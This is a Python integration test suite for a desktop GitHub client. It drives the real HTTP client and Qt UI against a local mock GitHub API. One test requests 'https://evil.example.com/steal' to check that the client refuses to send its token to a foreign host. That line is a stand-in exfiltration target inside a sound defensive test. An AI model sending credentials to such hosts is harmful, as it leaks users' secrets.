"""End-to-end tests against a real HTTP server.

Every other UI suite swaps the GitHub client for a stub, which proves the pages
call the right methods but never exercises the HTTP layer. Here the real
``GitHubClient`` talks real HTTP to a local stand-in for the GitHub API, so
status codes, pagination headers, base64 content, validation errors and
rate-limit responses are all genuinely parsed.

Nothing in this file reaches the internet or needs a token.
"""

from __future__ import annotations

import os
import sys
import time
from pathlib import Path
from typing import Any

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
sys.path.insert(0, str(Path(__file__).resolve().parent))

from _bootstrap import ensure_importable  # noqa: E402

ensure_importable()

from PySide6.QtWidgets import QApplication  # noqa: E402

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "tests"))

from tests.mock_github_server import VALID_TOKEN, MockGitHubServer  # noqa: E402

PASSED: list[str] = []
FAILED: list[str] = []


def check(name: str, condition: bool, detail: str = "") -> None:
    (PASSED if condition else FAILED).append(name)
    print(f"[{'PASS' if condition else 'FAIL'}] {name}" + (f" -> {detail}" if detail and not condition else ""))


def pump(app: QApplication, loops: int = 120) -> None:
    for _ in range(loops):
        app.processEvents()
        time.sleep(0.003)


def wait_for(predicate, app: QApplication, timeout: float = 8.0) -> bool:
    """Let the event loop run until ``predicate`` holds or time runs out."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        app.processEvents()
        if predicate():
            return True
        time.sleep(0.005)
    return predicate()


# --------------------------------------------------------------------- HTTP
def test_real_http_basics(server: MockGitHubServer) -> None:
    """The client must parse real payloads, not just call methods."""
    from app.core.github_api import GitHubClient, GitHubError

    client = GitHubClient(VALID_TOKEN, api_url=server.url)

    user = client.get_authenticated_user()
    check("GET /user parses the profile", user.login == "octocat", user.login)
    check("profile carries the name", user.name == "The Octocat", user.name)
    check("profile carries the bio", user.bio.startswith("Mascot"), user.bio)

    repos = client.list_repos(sort="updated")
    check("repo list loads", len(repos) == 3, str(len(repos)))
    check("repo fields decode", repos[0].stars == 128 and repos[0].language == "Python", str(repos[0]))
    check("private flag survives", any(r.private for r in repos), [r.name for r in repos])
    check("archived flag survives", any(r.archived for r in repos), [r.name for r in repos])

    repo = client.get_repo("octocat/hello-world")
    check("GET /repos/{o}/{r} parses", repo.full_name == "octocat/hello-world", repo.full_name)
    check("topics are exposed", "python" in repo.topics, str(repo.topics))
    check("default branch is read", repo.default_branch == "main", repo.default_branch)

    issues = client.list_issues("octocat/hello-world", state="open")
    check("issues load", len(issues) == 2, str(len(issues)))
    check("issue labels parse", issues[0].labels == ["bug", "good first issue"], str(issues[0].labels))
    check("issue body survives", "Steps to reproduce" in issues[0].body, issues[0].body[:40])
    check("pulls parse as issues", any(i.is_pr for i in client.list_pulls("octocat/hello-world")), "")

    commits = client.list_commits("octocat/hello-world", limit=40)
    check("commit message is first line only", commits[0].message == "feat: add README studio", commits[0].message)
    check("commit sha is shortened", len(commits[0].sha) == 7, commits[0].sha)
    check("commit author parsed", commits[0].author == "octocat", commits[0].author)

    releases = client.list_releases("octocat/hello-world")
    check("releases parse", releases[0].tag == "v1.2.0", releases[0].tag)

    tree = client.get_repo_tree("octocat/hello-world", branch="main", recursive=True)
    check("tree returns blobs only", "main.py" in tree and ".github" not in tree, str(tree[:4]))
    check("tree keeps nested files", ".github/workflows/ci.yml" in tree, str(tree))

    branches = client.list_branches("octocat/hello-world")
    check("branches parse", branches[:2] == ["main", "develop"], str(branches))

    readme = client.get_readme("octocat/hello-world")
    check("README is base64-decoded", readme is not None and readme.startswith("# Hello World"), (readme or "")[:40])
    check("README keeps its code fences", "```bash" in (readme or ""), "")
    missing = client.get_file("octocat/hello-world", "nope.txt")
    check("missing file returns None, not an error", missing is None, str(missing))

    rate = client.get_rate_limit()
    check("rate limit parses", rate.get("remaining", 0) > 0, str(rate))


def test_pagination_over_real_http(server: MockGitHubServer) -> None:
    """A real account has more repos than fit in one response.

    With the client's ``per_page=100``, anything past the first hundred is only
    reachable by walking the pages. A stub returning a fixed list can never
    catch a client that silently stops at page one.
    """
    from app.core.github_api import GitHubClient
    from tests.mock_github_server import mock_repos

    server.reset()
    server.state.repos = mock_repos(250)
    client = GitHubClient(VALID_TOKEN, api_url=server.url)

    repos = client.list_repos(sort="updated")
    check("all pages are walked", len(repos) == 250, str(len(repos)))
    check("no duplicates across pages", len({r.full_name for r in repos}) == 250, str(len({r.full_name for r in repos})))
    check("more than one page was requested", sum(1 for r in server.state.requests if r["path"] == "/user/repos") == 3, str([r["query"] for r in server.state.requests if r["path"] == "/user/repos"]))
    check("page numbers advance", [r["query"].get("page") for r in server.state.requests if r["path"] == "/user/repos"][:3] == ["1", "2", "3"], str([r["query"].get("page") for r in server.state.requests if r["path"] == "/user/repos"]))

    # A cap must be respected even when more pages exist.
    limited = client._paginate(client, "/user/repos", max_items=30, per_page=10)
    check("max_items caps the walk", len(limited) == 30, str(len(limited)))

    # Branches and orgs paginate through the same helper.
    check("branches still load", len(client.list_branches("octocat/hello-world")) == 2, "")
    server.reset()


def test_real_writes(server: MockGitHubServer) -> None:
    """Write paths must actually change server state."""
    from app.core.github_api import GitHubClient, GitHubError

    client = GitHubClient(VALID_TOKEN, api_url=server.url)

    created = client.create_repo(
        "integration-repo",
        description="Made by the integration suite",
        topics=["python", "testing"],
        private=False,
        auto_init=True,
    )
    check("create_repo returns the new repo", created.full_name == "octocat/integration-repo", created.full_name)
    listed = {r.full_name for r in client.list_repos()}
    check("the new repo shows up in a fresh list", "octocat/integration-repo" in listed, str(listed))
    check("topics were sent", any("/topics" in p for p in server.paths()), "")
    topics = client.list_topics("octocat/integration-repo")
    check("topics round-trip", "testing" in topics, str(topics))

    client.update_repo("octocat/integration-repo", description="Updated description")
    check("update_repo persists", client.get_repo("octocat/integration-repo").description == "Updated description", "")

    # README commit: create then update, which exercises the sha dance.
    result = client.commit_readme("octocat/hello-world", "# New\n\nBody.", "docs: update README")
    check("commit_readme creates the file", bool(result.get("commit")), str(result)[:80])
    check("content is stored on the server", server.state.files["README.md"] == "# New\n\nBody.", server.state.files["README.md"])
    client.commit_readme("octocat/hello-world", "# Newer", "docs: update README again")
    check("a second commit overwrites it", server.state.files["README.md"] == "# Newer", server.state.files["README.md"])

    client.write_file("octocat/hello-world", "docs/extra.md", "extra content", "docs: add extra")
    check("write_file creates a new path", server.state.files.get("docs/extra.md") == "extra content", "")

    branch = client.create_branch("octocat/hello-world", "feature/from-tests")
    check("create_branch returns the ref", branch["ref"] == "refs/heads/feature/from-tests", str(branch))
    check("the branch exists server-side", "feature/from-tests" in client.list_branches("octocat/hello-world"), str(client.list_branches("octocat/hello-world")))

    issue = client.create_issue("octocat/hello-world", "Found by the suite", body="## Steps\n\n1. run tests")
    check("create_issue returns a number", issue.number > 0, str(issue.number))
    comment = client.comment_issue("octocat/hello-world", issue.number, "Thanks for the report")
    check("comment_issue is accepted", comment["body"].startswith("Thanks"), str(comment))
    comments = client.list_comments("octocat/hello-world", issue.number)
    check("the comment is readable back", len(comments) == 1, str(len(comments)))

    updated = client.update_issue("octocat/hello-world", issue.number, state="closed")
    check("issue state changes", updated.state == "closed", updated.state)

    release = client.create_release("octocat/hello-world", "v9.9.9", name="9.9.9", body="## Notes\n\n- thing")
    check("create_release returns the tag", release.tag == "v9.9.9", release.tag)
    check("the release is listed", "v9.9.9" in {r.tag for r in client.list_releases("octocat/hello-world")}, "")

    client.update_profile(name="Renamed Octocat", blog="example.org")
    check("update_profile persists", client.get_authenticated_user().name == "Renamed Octocat", "")

    payload = client.upload_avatar(b"\x89PNG\r\n\x1a\n" + b"0" * 64, "image/png")
    check("avatar upload returns a url", payload["avatar_url"].startswith("https://"), str(payload))
    check("avatar was a POST", any("POST /user/avatars" in p for p in server.paths()), "")

    client.delete_repo("octocat/integration-repo")
    check("delete_repo removes it", "octocat/integration-repo" not in {r.full_name for r in client.list_repos()}, "")


def test_real_error_paths(server: MockGitHubServer) -> None:
    """Real 4xx/5xx bodies must turn into useful messages, not crashes."""
    from app.core.github_api import GitHubClient, GitHubError

    client = GitHubClient(VALID_TOKEN, api_url=server.url)

    # 401 - wrong token.
    bad = GitHubClient("wrong-token", api_url=server.url)
    try:
        bad.get_authenticated_user()
        check("401 raises", False, "no error")
    except GitHubError as exc:
        check("401 raises", exc.status == 401, str(exc.status))
        check("401 gets a friendly message", "Invalid or expired token" in str(exc), str(exc))

    # 404 - missing repo.
    try:
        client.get_repo("octocat/nope")
        check("404 raises", False, "no error")
    except GitHubError as exc:
        check("404 raises", exc.status == 404, str(exc.status))
        check("404 explains itself", "Not found" in str(exc), str(exc))

    # 422 - validation failure with a field error.
    try:
        client.create_repo("bad name!")
        check("422 raises", False, "no error")
    except GitHubError as exc:
        check("422 raises", exc.status == 422, str(exc.status))
        check("422 includes the field", "name" in str(exc), str(exc))

    # 403 - rate limit, including the reset headers.
    server.fail_next(403, "API rate limit exceeded for 203.0.113.1")
    try:
        client.get_authenticated_user()
        check("rate limit raises", False, "no error")
    except GitHubError as exc:
        check("rate limit raises", exc.status == 403, str(exc.status))
        check("rate limit is described", "rate limit" in str(exc).lower(), str(exc))
        check("rate limit is not a 404", "Not found" not in str(exc), str(exc))

    # 500 - server error, retried three times before giving up.
    server.reset()
    server.fail_next(500, "Server Error")
    try:
        client.get_authenticated_user()
        check("500 raises", False, "no error")
    except GitHubError as exc:
        check("500 raises", exc.status == 500, str(exc.status))

    # 409-style duplicate release.
    server.reset()
    client = GitHubClient(VALID_TOKEN, api_url=server.url)
    client.create_release("octocat/hello-world", "v2.0.0", name="2.0.0")
    try:
        client.create_release("octocat/hello-world", "v2.0.0", name="dup")
        check("duplicate release raises", False, "no error")
    except GitHubError as exc:
        check("duplicate release raises", exc.status == 422, str(exc.status))

    # Network failure: a closed port must surface as a GitHubError, not a
    # raw requests exception leaking through the UI.
    dead = GitHubClient(VALID_TOKEN, api_url="http://127.0.0.1:1")
    try:
        dead.get_authenticated_user()
        check("unreachable host raises GitHubError", False, "no error")
    except GitHubError as exc:
        check("unreachable host raises GitHubError", "Network error" in str(exc), str(exc)[:80])
    except Exception as exc:  # noqa: BLE001
        check("unreachable host raises GitHubError", False, f"{type(exc).__name__}: {exc}")

    check("no request escaped the token", all(r["authed"] or "avatars" in r["path"] for r in server.state.requests), "")


def test_token_never_leaves(server: MockGitHubServer) -> None:
    """Over real HTTP, the token must not be sent anywhere unvetted."""
    from app.core.github_api import GitHubClient, GitHubError

    client = GitHubClient(VALID_TOKEN, api_url=server.url)
    try:
        client.request("GET", "https://evil.example.com/steal")
        check("absolute foreign host refused", False, "no error")
    except GitHubError as exc:
        check("absolute foreign host refused", "Refusing" in str(exc), str(exc))
    except Exception as exc:  # noqa: BLE001
        check("absolute foreign host refused", False, f"{type(exc).__name__}: {exc}")

    # The configured mock host must be allowed, or nothing would work.
    built = client._build_url("/user")
    check("configured host is allowed", built.startswith(server.url), built)
    check("default client still targets GitHub", GitHubClient(VALID_TOKEN)._build_url("/user") == "https://api.github.com/user", "")

    # set_token must not silently re-point an Enterprise client at github.com.
    enterprise = GitHubClient(VALID_TOKEN, api_url=server.url)
    enterprise.set_token("another-token")
    check("set_token keeps the api url", enterprise.api_url == server.url, enterprise.api_url)
    check("set_token updates the header", enterprise._session.headers["Authorization"] == "Bearer another-token", "")
    enterprise.set_token("")
    check("clearing the token removes the header", "Authorization" not in enterprise._session.headers, "")


def test_full_ui_over_http(server: MockGitHubServer, app: QApplication) -> None:
    """Drive the real window against the real client over real HTTP."""
    from PySide6.QtCore import QTimer
    from PySide6.QtWidgets import QDialog

    from app.core.github_api import GitHubClient
    from app.ui.context import AppContext
    from app.ui.main_window import MainWindow
    from tests.feature_test import StubAI, auto_dialog, fill_dialog

    ctx = AppContext()
    ctx.secrets.set("github_token", VALID_TOKEN)
    ctx.github = GitHubClient(VALID_TOKEN, api_url=server.url)
    ctx.config.save(ai_provider="ollama", ai_base_url="http://localhost:11434/v1", ai_model="stub")
    ctx._stub_ai = StubAI("## Highlights\n\n- Faster startup")
    ctx.ai = lambda **kwargs: ctx._stub_ai  # type: ignore[assignment]

    window = MainWindow(ctx)
    window.resize(1500, 940)
    window.show()
    pump(app, 40)

    window.goto(1)  # Dashboard: profile + repos over HTTP
    pump(app, 40)
    check("dashboard fetched the profile", wait_for(lambda: ctx.profile is not None, app), str(ctx.profile))
    check("dashboard loaded repositories", wait_for(lambda: bool(ctx.repos), app), str(ctx.repos))
    check("repos came from HTTP", len(ctx.repos) == 3, str(len(ctx.repos)))
    check("GET /user was really sent", any("GET /user" in p for p in server.paths()), "")

    window.goto(2)  # README Studio
    pump(app, 40)
    page = window.pages[2]
    check("readme page picked a repo", wait_for(lambda: bool(page.repo), app), page.repo)
    check("branches loaded over HTTP", wait_for(lambda: page.branch_combo.count() >= 2, app), str(page.branch_combo.count()))

    page.editor.set_text("# Integration\n\nWritten against a real socket.")
    auto_dialog(True, 80)
    page.commit()
    ok = wait_for(lambda: "Integration" in server.state.files.get("README.md", ""), app)
    check("commit through the UI reached the server", ok, server.state.files.get("README.md", "")[:60])

    # Load existing content back over HTTP.
    page.load_existing()
    ok = wait_for(lambda: "Integration" in page.editor.text(), app)
    check("load existing rendered back into the editor", ok, page.editor.text()[:50])

    window.goto(4)  # Issues
    pump(app, 40)
    issues = window.pages[4]
    check("issues loaded over HTTP", wait_for(lambda: issues.list.count() > 0, app), str(issues.list.count()))
    issues.list.setCurrentRow(0)
    pump(app, 60)
    number = issues.current.number if issues.current else 0
    check("the issue list is populated", issues.list.count() > 0, str(issues.list.count()))

    stub_reply = ctx._stub_ai
    stub_reply.reply = "Could you share the stack trace?"
    auto_dialog(True, 140)
    issues.ai_reply()
    posted = wait_for(lambda: bool(server.state.comments.get(number)), app)
    check("AI reply posted a real comment", posted, str(server.state.comments))
    if server.state.comments.get(number):
        check("comment body came from the AI", "stack trace" in server.state.comments[number][-1]["body"], "")

    # Posting a reply refreshes the list. Two things must hold: while it is
    # loading there is no "current" issue (so no action can hit the wrong one),
    # and once it lands the user is back on the issue they were reading.
    wait_for(lambda: issues.list.count() > 0 and issues.current is not None, app)
    check(
        "selection survives the post",
        issues.current is not None and issues.current.number == number,
        f"current is #{issues.current.number if issues.current else None}, expected #{number}",
    )

    issues.toggle_state()
    closed = wait_for(
        lambda: any(i["number"] == number and i["state"] == "closed" for i in server.state.issues),
        app,
    )
    check(
        "closing an issue persisted on the server",
        closed,
        f"expected #{number}, server {[(i['number'], i['state']) for i in server.state.issues]}",
    )

    window.goto(5)  # Releases
    pump(app, 40)
    releases = window.pages[5]
    check("commits loaded over HTTP", wait_for(lambda: releases.commits.count() > 0, app), str(releases.commits.count()))
    check("releases loaded over HTTP", wait_for(lambda: releases.releases.count() > 1, app), str(releases.releases.count()))
    check("tag suggestion uses real tags", releases.suggest_tag() == "v1.3.0", releases.suggest_tag())

    ctx._stub_ai.reply = "## Highlights\n\n- Faster startup"
    releases.tag_input.setText("v1.4.0")
    releases.generate_notes()
    check("release notes streamed", wait_for(lambda: "Highlights" in releases.notes.toPlainText(), app), releases.notes.toPlainText()[:50])

    auto_dialog(True, 90)
    releases.publish()
    check(
        "release published to the server",
        wait_for(lambda: "v1.4.0" in {r["tag_name"] for r in server.state.releases}, app),
        str([r["tag_name"] for r in server.state.releases]),
    )

    window.goto(7)  # Account
    pump(app, 60)
    account = window.pages[7]
    check("profile page hydrated from HTTP", wait_for(lambda: account.fields["name"].text() != "", app), account.fields["name"].text())
    account.fields["name"].setText("Renamed By Test")
    account.save_profile()
    check("profile save persisted", wait_for(lambda: server.state.user.get("name") == "Renamed By Test", app), str(server.state.user.get("name")))

    window.goto(3)  # Repositories
    pump(app, 40)
    repos_page = window.pages[3]
    check("repository cards rendered from HTTP", wait_for(lambda: len(repos_page.repos) == 3, app), str(len(repos_page.repos)))

    auto_dialog(True, 90, picker="ui-created-repo")
    repos_page.create_repo()
    check(
        "create through the UI persisted",
        wait_for(lambda: any(r["name"] == "ui-created-repo" for r in server.state.repos), app),
        str([r["name"] for r in server.state.repos]),
    )

    # A failing API call must show a toast, not crash the window.
    server.fail_next(422, "Validation Failed")
    auto_dialog(True, 80, picker="")
    repos_page.create_repo()
    pump(app, 200)
    check("the window survives an API error", window.isVisible(), "")
    check("the window is still responsive", window.width() > 0, "")

    window.close()
    pump(app, 20)


def main() -> int:
    app = QApplication.instance() or QApplication(sys.argv)
    server = MockGitHubServer().start()
    try:
        test_real_http_basics(server)
        server.reset()
        test_pagination_over_real_http(server)
        test_real_writes(server)
        server.reset()
        test_real_error_paths(server)
        server.reset()
        test_token_never_leaves(server)
        server.reset()
        test_full_ui_over_http(server, app)
    finally:
        server.stop()

    print(f"\n{len(PASSED)} passed, {len(FAILED)} failed")
    for name in FAILED:
        print("  failed:", name)
    return 1 if FAILED else 0


if __name__ == "__main__":
    raise SystemExit(main())